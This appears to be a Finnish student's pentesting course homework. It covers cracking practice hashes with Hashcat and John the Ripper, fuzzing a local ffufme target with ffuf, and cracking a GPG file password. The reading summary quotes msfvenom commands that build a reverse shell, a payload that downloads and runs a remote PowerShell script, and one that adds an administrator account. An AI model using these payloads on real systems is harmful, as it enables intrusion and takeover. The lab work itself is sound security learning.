# H4 - Marraskuu2024!
##### Pentesting course taught by Tero Karvinen @ Haaga-Helia

## x) Lue/Katso ja tiivistä
### Karvinen 2022: Cracking Passwords with Haschat
- Plaintext-salasanojen sijaan järjestelmät tallentavat hasheja. Hashia ei voi muuttaa takaisin salasanaksi
- Samalla hashaus-menetelmällä hashatut salasanat antavat aina saman hashin, eli jos menetelmä on tiedossa niin sama salasana antaa saman hashin.
- Hashcat tarvitsee sanakirjan jonka avulla se voi vertailla salasanojen hasheja kräkättävään hashiin

### Karvinen 2023: Crack File Password with John
- Mikäli .zip-tiedoston sisältö on enkryptattu, tiedosto voidaan kyllä purkaa mutta kansio on tyhjä
- Jumbo John pystyy kräkkäämään suuren määrän eri tiedostomuotoja
- John käyttää myös sanakirjahyökkäystä
- Jumbo Johnista on myös maksullinen versio, mutta seuraamalla Teron ohjetta artikkelista sen saa koottua git:in avulla ilmaiseksi

### € Santos et al 2017: Security Penetration Testing - The Art of Hacking Series LiveLessons: Lesson 6: Hacking User Credentials
- Suurin osa järjestelmistä säilyttää salasanoja käyttäjätunnuksia ja salasanoja tietokannassa tai tekstitiedostossa
- Puolustajan näkökulmasta, säilöttyjen salasanojen lisäksi heidän tarvitsee suojata myös verkkoliikenteessä liikkuvia salasanoja
- John the Ripper käyttää oletuksena sanakirjanaan listaa yleisimmistä ihmisten käyttämistä salasanoista. Listaan voi lisätä omia salasanojaan, tai sitten voit luoda kokonaan uuden listan

### Polop et al 2024: HackTricks: MSFVenom
- MSFVenom on työkalu jolla saa tehtyä omia haittaohjelmia
- Hyökkääjän kannalta h yödyllisiltä kommenoilta vaikuttavat ne jotka luovat Shell yhteyden, tai suorittavat komennon:
  - Reverse Shell (Kohde kone avaa itse yhteyden hyökkääjäkoneeseen):
 
        msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > reverse.exe
  - Execute Command:

        msfvenom -a x86 --platform Windows -p windows/exec CMD="powershell \"IEX(New-Object Net.webClient).downloadString('http://IP/nishang.ps1')\"" -f exe > pay.exe
        msfvenom -a x86 --platform Windows -p windows/exec CMD="net localgroup administrators shaun /add" -f exe > pay.exe
- Nämä komennot ovat erityisesti Windows-ympäristöihin

## a) Hashcatin asennus ja esimerkkisalasanan murtaminen

Seurasin ohjeita Hashcatin asennukseen Tero Karvisen artikkelista [Cracking Passwords with Hashcat](https://terokarvinen.com/2022/cracking-passwords-with-hashcat/). Murrettava esimerkki-hash saadaan samasta artikkelista: 6b1628b016dff46e6fa35684be6acc96

Ensiksi päivitetään paketinhallinta ja asennetaan tarvittavat paketit:

    sudo apt-get update
    sudo apt-get -y install hashid hashcat wget

Wgetillä ladataan rockyou-sanakirja:

    wget https://github.com/danielmiessler/SecLists/raw/master/Passwords/Leaked-Databases/rockyou.txt.tar.gz
    tar xf rockyou.txt.tar.gz
    rm rockyou.txt.tar.gz

Komennolla ```hashid -m 6b1628b016dff46e6fa35684be6acc96``` tunnistetaan mahdollisesti käytetty hashaus-muoto.

![hashid]()

Ajetaan Hashcat komennolla ```hashcat -m 0 '6b1628b016dff46e6fa35684be6acc96' rockyou.txt -o solved```

Komennon argumentit on selitetty artikkelissa, mutta lyhyesti:

- **-m 0** = Hashin tyyppi
- **'6b1628b016dff46e6fa35684be6acc96'** = Murrettava hash
- **-o solved** = Tiedosto mihin murrettu salasana tallennetaan

![Hashcat Solved1]()

## John the Ripperin asennus ja esimerkkisalasanan murtaminen

Seurasin Tero karvisen artikkelia [Crack File Password with John](https://terokarvinen.com/2023/crack-file-password-with-john/) asennuksen apuna.

Asensin tarvittavat paketit, joiden tarkoitus on avattu ylläolevassa artikkelissa. Käyttäessäni Kali Linuxia löysin seuraavat paketit:

    sudo apt-get -y install bash-completion git build-essential libssl-dev zlib1g zlib1g-dev libbz2-1.0 libbz2-dev zip

Pakettia **zlib-gst** ei ollut saatavilla, ja muut paketit kuten **micro, atool ja wget** olin asentanut jo aiemmin.

Kloonataan John gitistä: ```git clone --depth=1 https://github.com/openwall/john.git``` ja asennetaan se ajamalla komento:

    cd john/src/	
    ./configure

Paketin kokoamiseen käytettävä make-komento tulostuu './configure':n tulostuksen lopussa:

    make -s clean && make -sj2

![John asennettu]()

Pääsen kokeilemaan Johnia lataamalla esimerkkitiedoston Teron artikkelista. Tiedosto on suojattu salasanalla, ja tarkoitus on murtaa salasana Johnin avulla.

Ensin kaivetaan .zip-tiedoston hash komennolla ```zip2john /home/osku/tero.zip >tero.zip.hash```. Tämän jälkeen annoin Johnin tehdä tehtävänsä: ```john tero.zip.hash```

![John Tero murrettu]()

Salasanan avulla pääsin purkamaan kohdetiedoston:

![Tero.zip loot]()

## d) Ffufme harjoitusmaalien ratkaisu

Harjoitusmaalin asennuksen ohjeet löytyy Tero Karvisen artikkelista [Fuffme - Install Web Fuzzing Target on Debian](https://terokarvinen.com/2023/fuffme-web-fuzzing-target-debian/).

Harjoitusmaalin asennus vaatii seuraavat paketit: docker.io, git, ffuf.

Kopioidaan harjoitusmaali gitistä, sekä kasataan se:

    git clone https://github.com/adamtlangley/ffufme
    cd ffufme/
    sudo docker build -t ffufme .

Sitten käynnistetään kohde: ```sudo docker run -d -p 80:80 ffufme```.

Varmistetaan toimivuus:

    ┌──(osku㉿kali)-[~/ffufme]
    └─$ curl -si localhost|grep title
    <title>FFUF.me</title>

Lisäksi ladataan vielä sanakirja fuzzausta varten:

    mkdir wordlists
    cd wordlists
    wget http://ffuf.me/wordlist/common.txt
    wget http://ffuf.me/wordlist/parameters.txt 
    wget http://ffuf.me/wordlist/subdomains.txt

Kokeillaanpas:

    ┌──(osku㉿kali)-[~]
    └─$ ffuf -w ~/wordlists/common.txt -u http://localhost/cd/basic/FUZZ

Ja tuloksena on:

    class                   [Status: 200, Size: 19, Words: 4, Lines: 1, Duration: 10ms]
    development.log         [Status: 200, Size: 19, Words: 4, Lines: 1, Duration: 12ms]

Kaikki toimii, eli nyt päästään ns. tositoimiin.

### Recursion:

Etsitään hakemistoja löydetyistä hakemistoista:

      ffuf -w ~/wordlists/common.txt -recursion -u http://localhost/cd/recursion/FUZZ

Tulos:

    admin                   [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 15ms]
    [INFO] Adding a new job to the queue: http://localhost/cd/recursion/admin/FUZZ
    
    [INFO] Starting queued job on target: http://localhost/cd/recursion/admin/FUZZ
    
    users                   [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 12ms]
    [INFO] Adding a new job to the queue: http://localhost/cd/recursion/admin/users/FUZZ
    
    [INFO] Starting queued job on target: http://localhost/cd/recursion/admin/users/FUZZ
    
    96                      [Status: 200, Size: 19, Words: 4, Lines: 1, Duration: 12ms]


    ┌──(osku㉿kali)-[~]
    └─$ curl -si http://localhost/cd/recursion/admin/users/96
    HTTP/1.1 200 OK
    Server: nginx/1.18.0 (Ubuntu)
    Date: Mon, 25 Nov 2024 09:09:45 GMT
    Content-Type: text/html; charset=UTF-8
    Transfer-Encoding: chunked
    Connection: keep-alive
    
    You Found The File! 

### File Extensions:

Lisätään .log jokaisen sanan loppuun jotta löydetään piilotettuja loki-tiedostoja:

    ffuf -w ~/wordlists/common.txt -e .log -u http://localhost/cd/ext/logs/FUZZ

Tulos:

    users.log               [Status: 200, Size: 19, Words: 4, Lines: 1, Duration: 12ms]
    
    ┌──(osku㉿kali)-[~]
    └─$ curl -si localhost/cd/ext/logs/users.log
    HTTP/1.1 200 OK
    Server: nginx/1.18.0 (Ubuntu)
    Date: Mon, 25 Nov 2024 09:09:29 GMT
    Content-Type: text/html; charset=UTF-8
    Transfer-Encoding: chunked
    Connection: keep-alive
    
    You Found The File! 

### No 404 Status

Filtteröidään tiedostot joiden koko on 669 tavua, sillä se on "Page Cannot Be Found" sivun koko.

    ffuf -w ~/wordlists/common.txt -u http://localhost/cd/no404/FUZZ

Tulos:

    secret                  [Status: 200, Size: 25, Words: 4, Lines: 1, Duration: 12ms]

    ┌──(osku㉿kali)-[~]
    └─$ curl -si http://localhost/cd/no404/secret
    HTTP/1.1 200 OK
    Server: nginx/1.18.0 (Ubuntu)
    Date: Mon, 25 Nov 2024 09:09:05 GMT
    Content-Type: text/html; charset=UTF-8
    Transfer-Encoding: chunked
    Connection: keep-alive
    
    Controller does not exist 

### Param Mining

Etsitään kadooneita parametrejä:

    ffuf -w ~/wordlists/parameters.txt -u http://localhost/cd/param/data?FUZZ=1

Tulos:
 
    debug                   [Status: 200, Size: 24, Words: 3, Lines: 1, Duration: 6ms]

    ┌──(osku㉿kali)-[~]
    └─$ curl -si http://localhost/cd/param/data?debug
    HTTP/1.1 200 OK
    Server: nginx/1.18.0 (Ubuntu)
    Date: Mon, 25 Nov 2024 09:08:47 GMT
    Content-Type: text/html; charset=UTF-8
    Transfer-Encoding: chunked
    Connection: keep-alive
    
    Required Parameter Found 

### Rate Limited

Hidastetaan fuzzausta, jotta ei saada banaania palvelimelta liian nopeiden pyyntöjen takia. '-t 5' luo 5 eri instanssia Ffufista, ja '-p 0.1' tauoittaa pyynnöt 0.1 sekunnin välein.

    ffuf -w ~/wordlists/common.txt -t 5 -p 0.1 -u http://localhost/cd/rate/FUZZ

Tulos:

    oracle                  [Status: 200, Size: 19, Words: 4, Lines: 1, Duration: 0ms]

    ┌──(osku㉿kali)-[~]
    └─$ curl -si http://localhost/cd/rate/oracle     
    HTTP/1.1 200 OK
    Server: nginx/1.18.0 (Ubuntu)
    Date: Mon, 25 Nov 2024 09:08:00 GMT
    Content-Type: text/html; charset=UTF-8
    Transfer-Encoding: chunked
    Connection: keep-alive

    You Found The File!

### Subdomains - Virtual Host Enumeration

Skannataan subdomaineja:

    ffuf -w ~/wordlists/subdomains.txt -H "Host: FUZZ.ffuf.me" -u http://localhost

Tulos:

    redhat                  [Status: 200, Size: 15, Words: 2, Lines: 1, Duration: 1ms]

Tässä tehtävässä osannut hakea subdomainin koko URL:ia.

## e) Tiedosto

Tätä tehtävää varten loin oman tiedoston jonka suojasin käyttäen GnuPG:tä:

    ┌──(osku㉿kali)-[~/target]
    └─$ gpg -c target_file

Kerätään tiedostosta hash:

    ┌──(osku㉿kali)-[~/john/run]
    └─$ gpg2john /home/osku/target/target_file.gpg > target_file.hash

Ja ajetaan John:

    ┌──(osku㉿kali)-[~/john/run]
    └─$ john target_file.hash 

# Lähteet:

- Karvinen, T. 2022. Cracking Passwords with Hashcat. Luettavissa: https://terokarvinen.com/2022/cracking-passwords-with-hashcat/. Luettu: 20.11.2024
- Karvinen, T. 2023. Crack File Password with John. Luettavissa: https://terokarvinen.com/2023/crack-file-password-with-john/. Luettu: 20.11.2024
- Karvinen, T. 2023. Fuffme - Install Web Fuzzing Target on Debian. Luettavissa. https://terokarvinen.com/2023/fuffme-web-fuzzing-target-debian/. Luettu: 25.11.2024
- Santos, O., Sternstein, J., Taylor, R., McCoy, C. 2017. Security Penetration Testing - The Art of Hacking Series. Video. Katsottavissa: https://learning.oreilly.com/videos/security-penetration-testing/9780134833989/9780134833989-sptt_00_06_00_00/. Katsottu: 21.11.2024
- HackTricks s.a. MSFVenom - CheatSheet. Luettavissa: https://book.hacktricks.xyz/generic-methodologies-and-resources/reverse-shells/msfvenom. Luettu: 20.11.2024
